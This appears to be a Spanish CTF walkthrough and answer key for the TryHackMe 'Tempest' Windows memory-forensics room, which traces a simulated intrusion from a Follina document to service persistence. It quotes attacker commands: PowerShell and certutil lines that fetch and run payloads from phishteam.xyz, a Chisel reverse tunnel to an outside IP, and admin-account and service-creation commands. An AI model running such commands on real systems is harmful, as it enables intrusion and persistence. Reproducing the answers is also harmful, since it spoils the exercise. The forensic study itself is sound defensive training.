# Tempest

| **Dificultad** | Medium |
| **Tipo** | CTF |
| **Slug** | `tempestincident` |
| **Link** | [TryHackMe](https://tryhackme.com/room/tempestincident) |
| **Sección** | 02 Level Medium |
| **Fuente** | texto oficial THM + anotaciones propias |
| **Componentes** | Windows DFIR / Volatility / process tree / registry / persistence / Mimikatz / C2 / lateral movement |
| **Impacto** | Reconstruir un incidente completo de Windows (dumping LSASS, C2, persistencia, escalada y movimiento lateral) desde un memory dump |

---

**Contexto:** Sala de forense de memoria Windows (incidente "Tempest"). Analizando un memory dump se reconstruye toda la cadena de ataque: proceso inusual, ejecución de cmdlets/PowerShell, creación de persistencia, movimiento lateral con Chisel/WinRM y escalada con PrintSpoofer.

## Solucionario

### Task 1: Detección y Preparación / Detection & Prep

**Explicación:**

Detección y preparación del análisis.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Preparation) | `No answer needed` |
| 2 | (Detection) | `No answer needed` |

### Task 2: Análisis de Procesos / Process Analysis

**Explicación:**

Se analiza el árbol de procesos y los hashes de los procesos sospechosos. Los hashes de los 3 procesos implicados son: `CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6`, `665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F` y `D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Process 1 hash) | `1. CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6` |
| 2 | (Process 2 hash) | `2. 665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F` |
| 3 | (Process 3 hash) | `3. D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60` |

### Task 3: Entendiendo el Incidente / Understanding the Incident

**Explicación:**

Entendiendo el incidente: el documento abierto es `free_magicules.doc`; el usuario implicado es `benimaru-TEMPEST`; el servicio/puerto de inyección es `496`; la IP de C2 es `167.71.199.191`. La cadena de ejecución inicial (decodificada) es:

```
$app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;
```

Y el CVE relacionado con el exploit inicial es `2022-30190` (Follina).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Document) | `1. free_magicules.doc` |
| 2 | (User) | `2. benimaru-TEMPEST` |
| 3 | (Injection service) | `3. 496` |
| 4 | (C2 IP) | `4. 167.71.199.191` |
| 5 | (Decoded chain) | `5. $app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;` |
| 6 | (CVE) | `6. 2022-30190` |

### Task 4: Persistencia / Persistence

**Explicación:**

Persistencia: la carpeta Startup donde vive la persistencia es `C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`. La línea de comandos maliciosa usa `certutil` y ejecuta `first.exe`:

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
```

El hash de `first.exe` es `CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8` y el C2 al que se conecta es `resolvecyber.xyz:80`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Startup folder) | `1. C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` |
| 2 | (Malicious command line) | `2. C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe` |
| 3 | (first.exe hash) | `3. CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8` |
| 4 | (C2) | `4. resolvecyber.xyz:80` |

### Task 5: Técnica Inicial / Initial Technique

**Explicación:**

La técnica inicial hace referencia a una página web `http://phishteam.xyz/02dcf07/index.html`, la codificación usada es **base64**. Se identifica la variable `q`, la ruta/endpoint `/9ab62b5`, y el método HTTP **GET**. El lenguaje de programación es **nim**.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (URL) | `1. http://phishteam.xyz/02dcf07/index.html` |
| 2 | (Encoding) | `2. base64` |
| 3 | (Variable) | `3. q` |
| 4 | (Path) | `4. /9ab62b5` |
| 5 | (HTTP method) | `5. GET` |
| 6 | (Language) | `6. nim` |

### Task 6: Movimiento Lateral / Lateral Movement

**Explicación:**

Movimiento lateral: la contraseña del usuario es `infernotempest`; el puerto de WinRM es `5985`; la línea de comandos de Chisel es `C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks`; el hash es `8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451`; la herramienta (tunnel) es `chisel` y el protocolo es `winrm`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Password) | `1. infernotempest` |
| 2 | (Port) | `2. 5985` |
| 3 | (Chisel command) | `3. C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks` |
| 4 | (Hash) | `4. 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451` |
| 5 | (Tool) | `5. chisel` |
| 6 | (Protocol) | `6. winrm` |

### Task 7: Escalada de Privilegios / Privilege Escalation

**Explicación:**

Escalada de privilegios: el exploit usado es `spf.exe` con hash `8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D`; la herramienta es `printspoofer`; el privilegio abusado es `SeImpersonatePrivilege`; el proceso/malware `final.exe` se ejecuta en el puerto `8080`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Exploit + hash) | `1. spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D` |
| 2 | (Tool) | `2. printspoofer` |
| 3 | (Privilege) | `3. SeImpersonatePrivilege` |
| 4 | (Process) | `4. final.exe` |
| 5 | (Port) | `5. 8080` |

### Task 8: Consecuencias y Resumen / Impact & Summary

**Explicación:**

Consecuencias: los usuarios administradores creados son `shion` y `shuna`; el comando de add usado es `/add`; el RID/RID group `4720`; el comando para añadir al grupo es `net localgroup administrators /add shion`; el RID de grupo es `4732`; y el comando de creación del servicio para persistir es `C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Users) | `1. shion,shuna` |
| 2 | (Add command) | `2. /add` |
| 3 | (RID) | `3. 4720` |
| 4 | (Add to group) | `4. net localgroup administrators /add shion` |
| 5 | (Group RID) | `5. 4732` |
| 6 | (Service create) | `6. C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto` |

---

**Metodología:**

1. Análisis de procesos con Volatility (pstree), obteniendo los hashes de los procesos sospechosos.
2. Reconstruir la técnica inicial: documento `free_magicules.doc` (Follina CVE-2022-30190) que decodifica una cadena base64 con PowerShell → descarga `update.zip` y lo expande en la carpeta Startup.
3. Carpetas Startup y persistencia: comando con `certutil` para descargar `first.exe` y conectarse a C2 `resolvecyber.xyz:80`.
4. Movimiento lateral: Chisel (SOCKS) + WinRM (5985) hacia `167.71.199.191`.
5. Escalada con PrintSpoofer (SeImpersonatePrivilege) para ejecutar `final.exe` en el puerto 8080.
6. Consecuencias: crear usuarios admin `shion`/`shuna` y persistencia como servicio `TempestUpdate2`.

**Learning chain:** free_magicules.doc -> Follina (CVE-2022-30190) -> base64/PS chain -> update.zip -> Startup persistence -> first.exe -> C2 resolvecyber.xyz -> chisel socks -> WinRM 5985 -> printspoofer SeImpersonate -> final.exe:8080 -> usuarios admin shion/shuna -> servicio TempestUpdate2

**Lección:** *La reconstrucción de un memory dump con Volatility permite seguir toda la cadena de ataque defensiva/hostil: desde un documento de Office (Follina) hasta la persistencia como servicio, pasando por C2, movimiento lateral (Chisel/WinRM) y escalada con PrintSpoofer.*

**MITRE ATT&CK:** T1203 (Exploitation for Client Execution) · T1547.001 (Boot/Logon Autostart: Startup) · T1105 (Ingress Tool Transfer) · T1021.006 (WinRM) · T1134.001 (Access Token Manipulation) · CWE-269 (Incorrect Privilege Assignment)

**Fuente:** [TryHackMe - Tempest](https://tryhackme.com/room/tempestincident)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
